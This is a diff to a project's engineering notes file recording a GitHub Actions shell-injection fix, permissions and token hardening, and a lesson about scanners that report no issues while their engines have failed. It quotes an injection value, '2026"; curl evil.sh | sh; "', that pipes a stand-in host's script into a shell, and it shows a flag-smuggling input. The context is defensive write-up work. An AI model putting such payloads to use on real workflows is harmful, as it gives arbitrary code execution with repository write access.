@@ -7624,6 +7624,101 @@ rule on the container does not apply to a programmatic scroll that asks for
 **Inline SVG needs explicit `width` and `height` attributes**, not just CSS.
 A cached stylesheet once let the logo expand to fill the entire screen.
 
+### A workflow input is a shell injection, and the scanner cleared the worse one
+
+Found 6 September 2026 by an Aikido scan of the repository, and then — the
+half worth reading — by a grep the scan did not think to run.
+
+**`${{ }}` is expanded by GitHub before the shell ever sees the line.** So an
+input interpolated into a `run:` block is not a variable, it is text pasted
+into a script, and `archive-weekly-actuals.yml` pasted `inputs.season` and
+`inputs.week` into two of them. A `workflow_dispatch` value of
+`2026"; curl evil.sh | sh; "` ran as a command — in a job holding
+`contents: write` and a checkout's persisted push token, which is repo write
+access escalating itself into arbitrary execution.
+
+Both sites take the value through `env:` now and quote it at the point of
+use. **The argument array is the second half of the fix and is not
+decoration**: a flat `"$ARGS"` string has lost its quoting by the time `node`
+is called, so a season of `2026 --force` still smuggles a flag past the
+`force` input. Quoted array elements survive word splitting, so every value
+arrives as exactly one argument. Verified by driving the real blocks with
+both shapes — command injection and flag smuggling each arrive as a single
+literal argument, and the normal and scheduled paths are unchanged.
+
+**The second site was found by grep, and the scanner had just reported that
+file clean.** The SAST rule matched only the first occurrence in the file;
+once that one was fixed the file came back with nothing, while this was still
+live four steps below it:
+
+```yaml
+git commit -m "Archive ${{ inputs.season || '2026' }} $WEEK actuals"
+```
+
+That is the worse of the two — it is in the step that then runs `git push` —
+and a clean re-scan would have signed it off. So the instruction is not "run
+the scanner again", it is:
+
+```bash
+grep -n '\${{' .github/workflows/*.yml   # then check which are inside a run: block
+```
+
+**A clean report from a tool that has already missed one instance of a thing
+is not evidence about the second instance.** That is the same shape as this
+file's own rule about asking the database rather than the response, and about
+a `.slice()` inside an assertion quietly narrowing what a test can see.
+
+**Two related holes closed with it, both of them about how much a token can
+do rather than what it is spent on.** `deploy-worker.yml` declared no
+`permissions:` block at all — the only workflow here that did not — so the
+job that ships the worker inherited the repository default for the whole
+`GITHUB_TOKEN`, the widest token in the set, to do a job that reads the repo
+and deploys with `CLOUDFLARE_API_TOKEN`. It is `contents: read`. And
+`persist-credentials: false` is on the three workflows that never push;
+`update-players`, `update_data` and `archive-weekly-actuals` do push and
+keep theirs, which is the dependency the `?v=` section already records.
+
+**Anything new under `.github/workflows/` inherits this.** A new `run:` block
+takes its inputs through `env:`, a new workflow declares `permissions:`, and
+a new checkout sets `persist-credentials: false` unless it is going to push.
+
+### An empty scan result is not a clean one
+
+The same sitting, and it is the reason any of the above was found at all.
+The first `aikido_full_scan` call returned `{"issues":[]}` — which reads as a
+clean repository and was two dead engines:
+
+```
+{"issues":[],"errors":{"sast":"Opengrep is not configured correctly",
+ "iac":"Failed to execute Checkov: spawn ...\checkov\checkov.exe ENOENT"}}
+```
+
+**The findings list and the errors object are separate fields, and only one
+of them was being read.** Checkov's binary ships at `checkov/dist/checkov.exe`
+and the MCP looks for `checkov/checkov.exe`; opengrep's on-disk install is
+complete and works — binary, 312 rules and the MCP's exact argument shape were
+all verified by hand — and the server resolves a null path in-process at
+startup, so it refuses before it spawns anything. Running the same engine
+against the same rules directly produced 35 findings on 229 files.
+
+So: **read `errors` before `issues`, on any scanner, and treat a zero-finding
+run against a repository this size as a question rather than an answer.** The
+tooling wearing a bug's clothes is a pattern this file records six times over;
+this is its inverse, and it is more dangerous, because nothing about it looks
+like a failure.
+
+**Most of what a scanner does report here is not a defect, which is the other
+half of learning to read it.** Of the 31 findings that remain, the two "SQL
+injection" hits in `store.js` build `?` placeholder groups from an array
+*length* with every value passed through `.bind(...)`; the ten `innerHTML`
+hits in `app.js` are the documented `escHtml()` / `safeGif()` /
+`safeNewsUrl()` paths, checked one by one; the four "SSRF" hits are hardcoded
+hosts with `encodeURIComponent` on every parameter; and the rest are local
+build scripts taking operator-supplied arguments. Triage against what the
+code actually does before changing any of it — and note that the one genuine
+finding in the whole pass was the one nothing flagged.
+
+
 ## Testing
 
 - **"Local wrangler crash-loops on this machine" was never true, and it cost
